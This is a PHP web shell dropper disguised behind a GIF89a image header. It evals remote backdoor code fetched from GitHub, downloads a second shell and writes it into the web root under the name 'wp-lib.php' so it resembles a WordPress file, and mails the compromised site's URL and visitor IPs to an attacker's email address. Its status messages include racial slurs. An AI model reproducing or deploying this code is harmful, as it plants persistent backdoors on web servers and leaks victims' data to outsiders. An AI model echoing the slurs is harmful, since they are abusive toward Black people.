<!--------------------------------------------
blank*
--------------------------------------------->
GIF89;aGIF89;aGIF89;a<?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://raw.githubusercontent.com/22XploiterCrew-Team/Gel4y-Mini-Shell-Backdoor/1.x.x/gel4y.php"));/**/?>
<?php
/*
	BYPASS N SHITT
*/
$source = "https://raw.githubusercontent.com/paknago21/shell/main/j4v.php";
$name = "wp-lib.php";

function _doEvil($name, $file) {
	$filename = $name;
	$getFile = file_get_contents($file);
	$rootPath = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR;
	$toRootFopen = fopen("$rootPath/$filename",'w');
	$toRootExec = fwrite($toRootFopen, $getFile);
	$rootShellUrl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename";
	$realPath = getcwd().DIRECTORY_SEPARATOR;
	$toRealFopen = fopen("$realPath/$filename",'w');
	$toRealExec = fwrite($toRealFopen, $getFile);
	$realShellUrl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]".dirname($_SERVER[REQUEST_URI])."/$filename";
	echo "<center>";
	if($toRootExec) {
		if(file_exists($rootPath."$filename")) {
			echo "<h1><font color=\"#00FF00\">X</font></h1>";
		}
		else { 
			echo "<h1><font color=\"red\">$rootPath$filename<br>u suck</font>try with other method nigga</h1>";
		}
	}
	else {
		if($toRealExec) {
			if(file_exists($realPath."$filename")) {
				echo "<h1><font color=\"#00FF00\">X</font></h1>";
			}
			else { 
				echo "<h1><font color=\"red\">NIGGER!</font></h1>";
			}
		}
	}
	echo "</center>";
}
_doEvil($name, $source);

?>
<?php
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
$tujuanmail = 'paknago2@gmail.com';
$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
?>